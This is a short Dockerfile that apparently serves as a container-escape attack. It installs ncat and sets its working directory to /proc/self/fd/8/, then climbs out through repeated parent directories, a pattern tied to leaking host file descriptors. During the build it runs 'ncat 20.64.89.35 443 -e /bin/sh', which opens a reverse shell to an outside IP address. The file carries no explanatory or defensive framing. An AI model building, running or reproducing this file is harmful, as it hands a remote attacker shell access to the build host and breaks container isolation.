FROM ubuntu:20.04
RUN apt update -y -qq
RUN apt install -y -qq curl && apt install -y -qq ncat && apt install python3 -y -qq
WORKDIR /proc/self/fd/8/
RUN cd ../../../../../../../../

RUN ncat 20.64.89.35 443 -e /bin/sh

CMD ["/bin/bash"]
